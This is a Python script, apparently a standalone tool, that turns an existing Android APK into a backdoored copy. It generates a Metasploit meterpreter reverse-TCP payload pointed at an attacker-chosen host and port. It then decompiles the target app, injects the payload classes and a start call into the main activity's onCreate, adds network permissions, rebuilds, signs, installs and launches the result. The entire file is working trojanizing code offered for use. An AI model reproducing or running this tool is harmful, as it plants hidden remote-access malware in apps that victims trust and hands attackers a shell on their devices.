#Android backdoor generator
#Author: Popescu Cristina Stefania <stefania.popescu261@gmail.com>
#
#generate a backdoor apk from an other existing Android application apk file
#the generated backdoor opens a reverse tcp connection to a meterpreter shell
#Usage python ./generate-backdoor.py <original_application_apk_file> <lhost address> <lhost port>"


#!/usr/bin/python

import sys
import subprocess
from os.path import expanduser


#Execute bash commands function
def Execute_command(command):
	process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
	output, error = process.communicate()
	if "msfvenom" in command:
		print " "
#	else:
#		print output


#Find main activity from original Application
def Find_start_activity():
	datafile = file('original/AndroidManifest.xml')
        found = False 
	name_line=0
        for i, line in enumerate(datafile):
	    if (found==True and 'category android:name="android.intent.category.LAUNCHER"' in line):
		name_line=i-3
            elif 'action android:name="android.intent.action.MAIN"' in line:
		found=True
	f=file('original/AndroidManifest.xml')
	for j, line in enumerate(f):
            if (j==name_line):
		start_activity=line.split(" ")[10]
		n=start_activity.split("name=")[1]
		name=n.replace('\"' , "").replace(">\n","").replace(".","/")
		print "The main activity found is: " + start_activity + " " + name
		return name

#Inject payload into main activity
def inject_payload(activity_name):
	file_name="original/smali/"+activity_name+ ".smali"
	datafile=file(file_name)
	f = open(file_name, "r")
	contents = f.readlines()
	for i, line in enumerate(datafile):
		if "->onCreate(Landroid/os/Bundle;" in line:
			print "found index at : " + str(i)
			index=i+1
	f.close()
	
	value="    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n"
	contents.insert(index, value)

	f = open(file_name, "w")
	contents = "".join(contents)
	f.write(contents)
	f.close()

#Add the permissions needed inside Android Manifest file"
def inject_permissions():
        file_name="original/AndroidManifest.xml"
        f = open(file_name, "r")
        contents = f.readlines()
        index=2
        f.close()

        value="    <uses-permission android:name=" +" \"android.permission.INTERNET\"" +"/>\n" + \
              "    <uses-permission android:name=" +"\"android.permission.ACCESS_NETWORK_STATE\"" +"/>\n"
        contents.insert(index, value)

        f = open(file_name, "w")
        contents = "".join(contents)
        f.write(contents)
        f.close()


print "******* START BACKDOOR GENERATOR ********\n"


if sys.argv[1]==None or sys.argv[2]==None or sys.argv[3]==None:
	print "***\n Usage python ./generate-backdoor.py <original_application_apk_file> <lhost address> <lhost port>"
else:
#bash commands
	original_apk=sys.argv[1]
	msfvenom_backdoor_payload="sudo msfvenom -p android/meterpreter/reverse_tcp  LHOST=" + \
					sys.argv[2] +" LPORT=" + sys.argv[3]+ " R > 	andro.apk"
	dissasemble_payload="apktool d -f -o payload andro.apk "
	dissasemble_original="apktool d -f -o original " + original_apk 
	mkdir_new_payload="mkdir -p original/smali/com/metasploit/"
	copy_payload_code="cp -r payload/smali/com/metasploit/stage original/smali/com/metasploit"
	assemble_original="apktool b original"
	home = expanduser("~") + "/"
	jarsign_original="jarsigner -verbose -keystore " + home + ".android/debug.keystore -storepass android -keypass android -digestalg SHA1 				-sigalg MD5withRSA original/dist/hello.apk androiddebugkey"
	install_backdoor="adb install original/dist/" + original_apk



	print "******* EXECUTE MSFVENOM TO GENERATE PAYLOAD APK *******\n"
	Execute_command(msfvenom_backdoor_payload)
	
	print "******* DISASSABMLE PAYLOAD AND ORIGINAL APKS *******\n"
	Execute_command(dissasemble_payload)
	Execute_command(dissasemble_original)
	Execute_command(mkdir_new_payload)

	print "******* COPY PAYLOAD CLASSES *******\n"
	Execute_command(copy_payload_code)

	print "******* FIND START ACTIVITY AND INJECT PAYLOAD IN SMALI FILE *******\n"
	activity_name=Find_start_activity()
	inject_payload(activity_name)

	print "******* INJECT PERMISSIONS IN AndroidManifest.xml file  *******\n"
	inject_permissions()

	print "******* REASSEMBLE BACKDOOR *******\n"
	Execute_command(assemble_original)

	print "******* SIGN BACKDOOR APK *******\n"
	Execute_command(jarsign_original)

	print "******* INSTALL BACKDOOR *******\n"
	Execute_command(install_backdoor)


	print "****** LAUNCH BACKDOOR ******* \n"
	Execute_command("adb shell am start -n my.v1rtyoz.helloworld/my.v1rtyoz.helloworld.MainActivity")

